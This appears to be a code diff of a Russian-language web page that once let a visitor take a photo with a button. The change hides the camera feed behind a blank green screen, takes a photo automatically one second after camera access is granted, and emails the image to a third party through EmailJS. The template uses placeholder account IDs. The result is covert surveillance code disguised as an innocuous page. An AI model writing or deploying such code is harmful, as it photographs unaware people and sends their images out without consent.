@@ -2,37 +2,66 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Фото с камеры</title>
+  <title>Авто фото</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background-color: green; /* зелёная трава */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+    }
+    video, canvas, img {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-  <h2>Фото с вашей камеры</h2>
-  <video id="video" autoplay playsinline width="320" height="240"></video>
-  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
-  <br>
-  <button id="photoBtn">Сделать фото</button>
-  <br><br>
-  <img id="photo" alt="Ваше фото появится тут" style="display:none; border:1px solid #ccc;">
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
   <script>
+    // Инициализация EmailJS
+    emailjs.init("ТВОЙ_USER_ID");
+
+    function sendPhoto(photoUrl) {
+      emailjs.send('service_zv13ydk', 'ТВОЙ_TEMPLATE_ID', {
+        time: new Date().toLocaleString(),
+        photo_link: photoUrl
+      })
+      .then(response => console.log('Письмо отправлено!'))
+      .catch(error => console.error('Ошибка отправки:', error));
+    }
+
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const photoBtn = document.getElementById('photoBtn');
-    const photo = document.getElementById('photo');
 
-    // Запросить доступ к камере
+    // Запрос доступа к камере
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
+
+        // Ждём 1 секунду и делаем фото
+        setTimeout(() => {
+          const context = canvas.getContext('2d');
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const photoData = canvas.toDataURL('image/png');
+
+          console.log('Фото сделано:', photoData);
+
+          // Отправка на почту через EmailJS
+          sendPhoto(photoData);
+        }, 1000); // задержка 1 секунда
       })
       .catch(err => {
         alert("Ошибка доступа к камере: " + err.message);
       });
-
-    // Сделать фото
-    photoBtn.onclick = function() {
-      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-      photo.src = canvas.toDataURL('image/png');
-      photo.style.display = 'block';
-    };
   </script>
 </body>
 </html>
